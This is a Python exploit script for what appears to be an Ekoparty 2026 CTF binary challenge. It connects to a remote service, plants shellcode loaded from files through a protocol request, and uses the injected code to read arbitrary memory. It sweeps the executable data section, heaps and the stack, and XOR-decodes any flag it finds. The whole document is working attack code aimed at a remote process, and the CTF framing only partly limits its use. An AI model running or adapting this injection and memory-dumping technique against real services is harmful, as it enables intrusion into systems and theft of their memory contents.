#!/usr/bin/env python3
# 1 conexao, alvos ranqueados (fork1): EXE .data BSS -> arena -> ptrA/ptrC -> heaps -> stack.
# Pula 0x1200000 (dead-end confirmado). So UM flag=2 (plant) + 1 re-plant p/ stack no fim.
# FORCE=1 -> ignora banner degradado e tenta as requests mesmo assim (handlers podem responder).
# Uso: python3 final_scan.py            (espera banner)
#      FORCE=1 python3 final_scan.py    (ignora banner, tenta direto)
import socket, struct, re, os, time
HOST, PORT = "<IP>", 20269
COOKIE  = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
SLOT    = 0x1620
HIK     = re.compile(rb'HIK_[\x20-\x7e]{6,200}')
REAL    = re.compile(rb'HIK_[A-Za-z0-9_]{3,60}_[0-9a-f]{32}')  # flag "de verdade"
XKEY    = bytes.fromhex("9c25a203")                            # chave XOR-4 da flag1

def detect(r):
    """acha HIK_ em texto puro OU cifrada XOR-4 (como a flag1: 'FLAG: '+blob)."""
    m=REAL.search(r) or HIK.search(r)
    if m: return m.group().decode(errors='replace')
    # XOR-4 com a chave conhecida
    dec=bytes(r[i]^XKEY[i%4] for i in range(len(r)))
    m=REAL.search(dec)
    if m: return m.group().decode()+"  [XOR4 9c25a203]"
    # sliding: deriva chave assumindo 'HIK_' em cada offset de um marcador 'FLAG'
    for fm in re.finditer(rb'FLAG', r):
        for st in range(fm.end(), min(fm.end()+16, len(r)-57)):
            k=bytes(r[st+j]^b"HIK_"[j] for j in range(4))
            seg=bytes(r[st+j]^k[j%4] for j in range(min(60,len(r)-st)))
            mm=REAL.match(seg)
            if mm: return mm.group().decode()+f"  [XOR4 {k.hex()} @+0x{st:x}]"
    return None
D       = os.path.dirname(os.path.abspath(__file__))
u64 = lambda b,o=0: struct.unpack("<Q", b[o:o+8])[0]
PROC_HEAPS_PTR = 0x7ffaf4673da0
FORCE = os.environ.get("FORCE") == "1"

def rd(s,n,to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout, ConnectionResetError, OSError): pass
    return b
def req(s,flag,counter,length,body=b""):
    s.sendall(struct.pack("<IBII",13+len(body),flag,counter,length)+body); return rd(s,length)
def connect(tries=400,wait=6):
    # retry AGRESSIVO p/ pegar o restart (a cada 10min) no instante em que fica saudavel.
    t0=time.time()
    for i in range(tries):
        try:
            s=socket.create_connection((HOST,PORT),timeout=6); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        except Exception as e:
            print(f"[{int(time.time()-t0)}s] connect fail: {e}"); time.sleep(wait); continue
        s.sendall(COOKIE); b=rd(s,20,to=4.0)
        if b==HEALTHY:
            print(f"[+] banner OK (tent {i+1}, {int(time.time()-t0)}s) -- JANELA LIMPA, disparando"); return s
        if FORCE:
            print(f"[~] degradado mas FORCE=1 -> tentando mesmo assim"); return s
        if i%10==0: print(f"[{int(time.time()-t0)}s] degradado (tent {i+1}), caçando restart a cada {wait}s...")
        s.close()
        if i<tries-1: time.sleep(wait)
    return None
def plant(s, scname):
    sc=open(os.path.join(D,scname),"rb").read()
    r=req(s,2,SLOT,len(sc),sc); ok=len(r)>0
    print(f"[{'+' if ok else '!'}] plant {scname} ({len(sc)}B) -> resp {len(r)}B {'OK' if ok else 'FALHOU'}")
    return ok
def absread(s,addr,length):
    # headroom: RPM escreve `length` bytes em body+0xd; body precisa ser > length p/ nao estourar
    # o buffer (13+len(body)) e corromper a heap (causa do "conexao caiu" na 2a leitura).
    body=struct.pack("<Q",addr).ljust(length+0x200,b"\x00")
    return req(s,0,0,length,body)

DUMP=bytearray()
def sweep(s, name, read_fn, start, size, found, max_stale=24):
    print(f"\n== {name} ==")
    prev=None; stale=0
    for off in range(start,start+size,0x1000):
        r=read_fn(off)
        if len(r)==0: print("  conexao caiu"); return False
        if sum(r): DUMP.extend(struct.pack("<Q",off)+r)   # guarda p/ brute offline depois
        fl=detect(r)
        if fl:
            print(f"  >>> FLAG @off=0x{off:x}: {fl}"); found.append(fl); return True
        z=(sum(r)==0); st=(r==prev)
        if z or st:
            stale+=1
            if stale>=max_stale: print(f"  (stop: {max_stale} vazias/STALE em off=0x{off:x})"); break
        else:
            stale=0; asc=''.join(chr(x) if 32<=x<127 else '.' for x in r[:28])
            print(f"  off=0x{off:x}: {r[:12].hex()} | {asc}")
        prev=r
    return True

def main():
    s=connect()
    if not s: print("sem conexao util apos retries; aguardar restart (10min)."); return
    found=[]

    # recon flag=1 (sem wipe): le struct 0xe360..0xe3c8 p/ ptrA/ptrC vivos
    win=req(s,1,0xe360,0x68)
    ptrA=u64(win,0x08) if len(win)>=0x10 else 0   # [0xe368]
    ptrC=u64(win,0x40) if len(win)>=0x48 else 0   # [0xe3a0]
    print(f"[recon] len={len(win)} ptrA(0xe368)=0x{ptrA:x} ptrC(0xe3a0)=0x{ptrC:x}")
    if len(win)==0:
        print("  >>> flag=1 nao respondeu (handler morto no estado degradado). abortar."); s.close(); return

    if not plant(s,"sc_absread.bin"):
        print("  >>> plant falhou; sem read arbitrario. abortar."); s.close(); return

    tgt=[
      ("EXE .data BSS 0x14000d000", lambda off: absread(s,0x14000d000+off,0x1000), 0, 0xd000),
      ("arena 0x1201000",            lambda off: absread(s,0x1201000+off,0x1000),   0, 0x4f000),
    ]
    if 0x10000<=ptrA<0x7ff000000000:
        tgt.append((f"ptrA 0x{ptrA:x}", lambda off: absread(s,(ptrA&~0xfff)-0x1000+off,0x1000), 0, 0x22000))
    if 0x10000<=ptrC<0x7ff000000000:
        tgt.append((f"ptrC 0x{ptrC:x}", lambda off: absread(s,(ptrC&~0xfff)-0x1000+off,0x1000), 0, 0x8000))
    # outros heaps
    arr=absread(s,PROC_HEAPS_PTR,16*8)
    heaps=[u64(arr,i*8) for i in range(16) if 0x10000<=u64(arr,i*8)<0x7ff000000000]
    print("[heaps]", ", ".join(hex(h) for h in heaps))
    for i,h in enumerate(heaps):
        tgt.append((f"heap[{i}] 0x{h:x}", lambda off,h=h: absread(s,h+off,0x1000), 0, 0x40000))

    for name,fn,st,sz in tgt:
        if found: break
        if not sweep(s,name,fn,st,sz,found): break

    # FASE B: stack
    if not found and plant(s,"sc_stackscan.bin"):
        sweep(s,"STACK (TEB->StackBase)", lambda off: req(s,0,off,0x1000,b""), 0x1000, 0x180000, found, max_stale=40)

    s.close()
    open(os.path.join(D,"final_scan_dump.bin"),"wb").write(DUMP)
    print(f"\n[+] dump bruto salvo: final_scan_dump.bin ({len(DUMP)}B) -- brute XOR offline se precisar")
    print("== RESUMO ==")
    if found:
        for f in set(found): print("FLAG2 CANDIDATA:", f)
    else:
        print("nada nos alvos ranqueados; restam outras threads' stacks / regioes nao referenciadas.")

if __name__=="__main__": main()
